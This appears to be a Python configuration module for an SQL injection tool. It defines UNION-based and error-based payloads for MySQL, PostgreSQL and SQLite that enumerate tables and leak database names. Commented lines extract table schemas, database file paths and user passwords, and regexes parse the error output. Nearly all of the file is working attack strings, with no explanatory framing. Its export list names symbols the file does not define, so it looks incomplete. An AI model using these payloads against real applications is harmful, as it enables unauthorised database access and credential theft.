index = 0
table = ""
TABLE_PAYLOAD = {
    'mysql': "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() -- -",
    'pgsql': "9999' UNION SELECT table_name, '' FROM information_schema.tables WHERE table_schema='public'-- -",
    'sqlite': "' UNION SELECT '', name FROM sqlite_master WHERE type='table' -- ",
}

DBNAME_PAYLOAD = {
    'mysql': "' AND updatexml(NULL, CONCAT(0x3a, DATABASE()), NULL) -- -",
    'pgsql': "1' AND 1=CAST((SELECT current_database()) AS INT)--",
    'sqlite': "",
}

# ' UNION SELECT '', sql FROM sqlite_master WHERE type='table' AND name='{table_name}'-- 
# ' UNION SELECT '', file FROM pragma_database_list-- 
# ' UNION SELECT username, password FROM users LIMIT 0,100-- 

DB_TYPE = {
    'mysql': {
        'type': 'mysql',
        'regx': r"':(\w+)'",
    },
    'pgsql': {
        'type': 'pgsql',
        'regx':  r': "(\w+)"',
    },
    'sqlite': {

    },
    'redirect': {
        'type': 'redirect'
    }
}

__all__ = ['index', 'content', 'comment', 'PAYLOAD', 'DB_TYPE', 'TABLE_PAYLOAD', 'DBNAME_PAYLOAD', 'COLUMN_PAYLOAD']